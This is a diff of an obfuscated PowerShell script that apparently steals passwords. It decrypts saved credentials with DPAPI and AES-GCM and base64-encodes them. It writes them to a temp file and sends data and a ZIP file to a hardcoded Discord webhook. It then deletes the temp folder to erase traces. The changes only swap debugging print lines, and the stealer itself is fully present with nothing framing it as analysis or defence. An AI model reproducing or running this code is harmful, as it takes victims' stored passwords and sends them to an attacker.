@@ -18,19 +18,14 @@ $x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String
 for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
 $c=[W]::B($s,5)
 try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
-"pos"
 $e=[byte[]]::new($k-31)
-"2"
 $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
-"3"
 $r=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($l)-join','))
-"4"
-WriteOutput "after"
-"script1"
 $r > $env:TEMP\pws.txt
-Write-Output $r
+"test"
+$r
 function Upload-Discord {
-
+"lo"
 [CmdletBinding()]
 param (
     [parameter(Position=0,Mandatory=$False)]
@@ -38,22 +33,22 @@ param (
     [parameter(Position=1,Mandatory=$False)]
     [string]$text 
 )
-
+"lol"
 $hookurl = "https://discord.com/api/webhooks/1064607123096469634/7BQIgCoEvFP7TQT61g90tpGL5IRNjJ7FSWzlnhwMtmunPtVjwTzkkm1TriOXiLCwTPfm"
 
 $Body = @{
   'username' = $env:username
   'content' = $text
 }
-
+"kek"
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-
+"kek1"
 Upload-Discord -file "$env:tmp/$ZIP"
-
+"kek3"
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 
